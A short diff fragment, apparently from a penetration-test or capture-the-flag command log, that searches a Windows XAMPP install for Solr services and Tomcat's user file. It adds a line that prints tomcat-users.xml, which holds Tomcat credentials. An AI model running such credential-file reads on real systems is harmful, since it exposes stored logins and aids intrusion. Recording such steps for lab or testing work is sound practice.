@@ -90,6 +90,8 @@ sc query state= all | findstr /i solr
 
 cmd /c "dir C:\xampp\tomcat /s /b | findstr tomcat-users.xml"
 
+type C:\xampp\tomcat\conf\tomcat-users.xml
+
 1
 python3 - << 'PY'
 import base64
